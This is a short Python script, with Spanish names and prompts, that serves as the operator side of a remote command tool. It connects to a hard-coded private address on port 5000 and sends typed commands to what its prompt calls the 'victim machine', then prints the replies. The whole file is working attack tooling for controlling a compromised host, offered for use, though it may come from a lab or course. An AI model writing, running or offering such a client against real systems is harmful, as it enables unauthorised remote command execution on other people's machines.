#!/usr/bin/env python3

from socket import socket, SOL_SOCKET, SO_REUSEADDR


def fCerrarSocket(vSocket):
  try:
    if vSocket:
      vSocket.close()
  except:
    pass


def fMain():
  cIpServidor = '192.168.6.38'
  cPuertoServidor = 5000
  cTamBuffer = 4096

  vServerAddress = (cIpServidor, cPuertoServidor)
  vEstado = True
  vClientSocket = None

  try:
    vClientSocket = socket()
    vClientSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    vClientSocket.connect(vServerAddress)

    while vEstado:
      vComandoEnviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ").strip()

      if vComandoEnviar == 'exit':
        vClientSocket.send(vComandoEnviar.encode())
        vEstado = False
      else:
        vClientSocket.send(vComandoEnviar.encode())
        vRespuesta = vClientSocket.recv(cTamBuffer)
        print(vRespuesta.decode())

  finally:
    fCerrarSocket(vClientSocket)


if __name__ == '__main__':
  fMain()
